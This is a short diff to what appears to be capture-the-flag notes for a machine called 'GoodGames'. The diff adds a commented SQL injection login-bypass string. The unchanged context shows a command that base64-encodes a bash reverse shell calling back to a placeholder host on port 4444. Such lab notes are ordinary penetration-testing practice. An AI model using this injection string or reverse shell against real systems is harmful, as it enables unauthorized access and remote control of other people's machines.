@@ -3,6 +3,9 @@
 ## GoodGames
 
 ```bash
+# SQLi sample
+# admin' or 1 = 1 -- -
+
 # create base64 of reverse shell
 echo -ne 'bash -i >& /dev/tcp/{HOST_IP}/4444 0>&1' | base64
 
